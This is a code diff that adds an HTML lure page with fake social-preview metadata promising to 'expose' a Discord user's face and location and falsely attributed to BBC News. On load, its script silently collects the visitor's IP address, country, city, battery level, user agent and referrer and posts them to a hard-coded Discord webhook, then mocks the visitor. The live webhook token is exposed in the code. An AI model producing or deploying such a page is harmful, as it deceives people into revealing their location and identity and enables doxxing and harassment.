@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta tag="title" content="Z exposed">
+    <meta tag="description" content="The online user on discord named Z has been exposed (Face, Location etc)!">
+    <meta tag="image" content="https://i.ibb.co/4K77rFv/Untitled141-20241118205737.png">
+    <meta property="og:title" content="Z exposed">
+    <meta property="og:description" content="The online user on discord named Z has been exposed (Face, Location etc)!">
+    <meta property="og:image" content="https://i.ibb.co/4K77rFv/Untitled141-20241118205737.png">
+    <meta property="og:url" content="https://example.com/your-page-url">
+    <meta property="og:author" content="BBC News">
+    <meta property="og:type" content="website"> <!-- Change to "article" if it's a blog post or news -->
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image"> <!-- Use "summary" for a smaller image card -->
+    <meta name="twitter:title" content="Your Page Title">
+    <meta name="twitter:description" content="A short description of your page.">
+    <meta name="twitter:image" content="https://i.ibb.co/4K77rFv/Untitled141-20241118205737.png">
+    <meta name="twitter:url" content="https://example.com/your-page-url">
+    <title>Device Info Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+            background-image: url('https://media1.tenor.com/m/QO080UUDxYAAAAAC/shabjdeed-palastine.gif');
+        }
+        .info {
+            text-align: center;
+            padding: 20px;
+            background: #fff;
+            background-image: url("https://media1.tenor.com/m/Klqm-5gHkkcAAAAC/shabjdeed-dance.gif");
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            color: orange;
+        }
+        .text-border {
+            color: white; /* Inner text color */
+            text-shadow: 
+                -1px -1px 0 black,
+                 1px -1px 0 black,
+                -1px  1px 0 black,
+                 1px  1px 0 black;
+        }
+    </style>
+</head>
+<body>
+    <div class="info">
+        <h1 class="text-border">Thanks for your IP, sweety</h1>
+        <p><span id="ip"></span></p>
+    </div>
+
+    <script>
+        async function sendWebhook(data) {
+            const webhookUrl = "https://discord.com/api/webhooks/1307380907677847552/__S37GTJRPAuwCJkseCjnI5fGZ7KyqdAMneApWVk9L_vlY5BSe1EideZqK7uPrgqO7j_";
+
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: data
+                })
+            });
+        }
+
+        async function getDeviceInfo() {
+            let ipInfo = {};
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                ipInfo = await ipResponse.json();
+            } catch (error) {
+                console.error("Error fetching IP info:", error);
+            }
+
+            // Get battery info if available
+            let batteryLevel = "Unavailable";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = Math.round(battery.level * 100) + "%";
+                } catch (error) {
+                    console.error("Error getting battery info:", error);
+                }
+            }
+
+            // Get device and referrer info
+            const device = navigator.userAgent;
+            const referrer = document.referrer || "Direct Access";
+
+            // Format data to send
+            const message = `
+                IP: ${ipInfo.ip || "Unavailable"}
+                Country: ${ipInfo.country_name || "Unavailable"}
+                City: ${ipInfo.city || "Unavailable"}
+                Referrer: ${referrer}
+                Battery: ${batteryLevel}
+                Device: ${device}
+            `;
+
+            sendWebhook(message);
+        }
+
+        // Run the function to gather and send info
+        getDeviceInfo();
+    </script>
+    
+</body>
+</html>
